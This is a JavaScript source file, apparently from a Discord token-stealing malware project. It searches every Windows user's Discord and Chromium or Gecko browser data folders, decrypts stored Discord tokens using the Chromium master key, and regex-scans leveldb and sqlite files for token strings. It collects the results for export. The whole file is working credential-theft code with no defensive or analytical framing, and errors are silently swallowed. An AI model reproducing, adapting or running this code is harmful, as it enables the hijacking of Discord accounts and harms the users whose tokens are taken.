const path = require('path');
const fs = require('fs/promises');
const glob = require('glob');

const browsersPaths = require("./../browsers/paths.js");
const browsersProfiles = require("./../browsers/profiles.js");

const hardware = require("./../../utils/hardware/hardware.js");

const tokens = [];

const RegexpApps = /dQw4w9WgXcQ:[^"]*/g;
const RegexpBrowsers = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g;

const c = require("./../browsers/chromium.js");
const chromium = new c.Chromium();

const GetTokens = async () => {
    const users = await hardware.GetUsers();

    for (const user of users) {
        const discordPaths = browsersPaths.GetDiscordPaths();
        for (const [name, discordPath] of Object.entries(discordPaths)) {
            const fullPath = path.join(user, 'AppData', 'Roaming', discordPath);

            try {
                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                };

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                };

                const discordDir = path.dirname(fullPath);

                const masterKey = await chromium.GetMasterKey(discordDir);
                if (!masterKey) {
                    continue;
                };

                const leveldbFiles = glob.globSync(path.join(discordDir, 'Local Storage', 'leveldb', '*.ldb').replace(/\\/g, '/'));
                const logFiles = glob.globSync(path.join(discordDir, 'Local Storage', 'leveldb', '*.log').replace(/\\/g, '/'));
                const files = leveldbFiles.concat(logFiles);

                if (files.length === 0) {
                    continue;
                };

                for (const file of files) {
                    if (file.includes('cord')) {
                        const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                        for (const line of lines) {
                            const matches = line.match(RegexpApps) || [];

                            if (matches) {
                                for (const match of matches) {
                                    const encodedPass = match.split('dQw4w9WgXcQ:')[1];
                                    const decodedPass = Buffer.from(encodedPass, 'base64');
                                    const token = chromium.Decrypt(decodedPass, masterKey);

                                    if (!tokens.some(t => t.token === token)) {
                                        tokens.push({
                                            browser: name,
                                            token: token
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (err) {
            }
        };

        const chromiumBrowsers = browsersPaths.GetChromiumBrowsers();
        for (const [name, browserPath] of Object.entries(chromiumBrowsers)) {
            const fullPath = path.join(user, browserPath);

            try {
                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                };

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                };

                const profilePaths = browsersProfiles.GetChromiumProfiles(fullPath, name);

                if (profilePaths.length === 0) {
                    continue;
                };

                for (const profile of profilePaths) {
                    const profileStats = await fs.stat(profile.path);
                    if (!profileStats.isDirectory()) {
                        continue;
                    };

                    const profileFiles = await fs.readdir(profile.path);
                    if (profileFiles.length <= 10) {
                        continue;
                    };

                    const leveldbFiles = glob.globSync(path.join(profile.path, 'Local Storage', 'leveldb', '*.ldb').replace(/\\/g, '/'));
                    const logFiles = glob.globSync(path.join(profile.path, 'Local Storage', 'leveldb', '*.log').replace(/\\/g, '/'));
                    const files = leveldbFiles.concat(logFiles);

                    if (files.length === 0) {
                        continue;
                    };

                    for (const file of files) {
                        if (file.endsWith('.ldb') || file.endsWith('.log')) {
                            const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                            for (const line of lines) {
                                const matches = line.match(RegexpBrowsers) || [];

                                if (matches) {
                                    for (const token of matches) {
                                        if (!tokens.some(t => t.token === token)) {
                                            tokens.push({
                                                browser: name,
                                                token: token
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (err) {
            }
        };

        const geckoBrowsers = browsersPaths.GetGeckoBrowsers();
        for (const [name, browserPath] of Object.entries(geckoBrowsers)) {
            const fullPath = path.join(user, browserPath);

            try {
                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                }

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                }

                const profilePaths = browsersProfiles.GetGeckoProfiles(fullPath, name);

                if (profilePaths.length === 0) {
                    continue;
                }

                for (const profile of profilePaths) {
                    const profileStats = await fs.stat(profile.path);
                    if (!profileStats.isDirectory()) {
                        continue;
                    };

                    const profileFiles = await fs.readdir(profile.path);
                    if (profileFiles.length <= 10) {
                        continue;
                    };

                    const files = glob.globSync(path.join(profile.path, '**', '*.sqlite').replace(/\\/g, '/')); 
                    
                    if (files.length === 0) {
                        continue;
                    };

                    for (const file of files) {
                        if (file.endsWith('.sqlite')) {
                            const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                            for (const line of lines) {
                                const matches = line.match(RegexpBrowsers) || [];

                                if (matches) {
                                    for (const token of matches) {
                                        if (!tokens.some(t => t.token === token)) {
                                            tokens.push({
                                                browser: name,
                                                token: token
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (err) {
            }
        }
    };

    return tokens;
};

module.exports = {
    GetTokens
};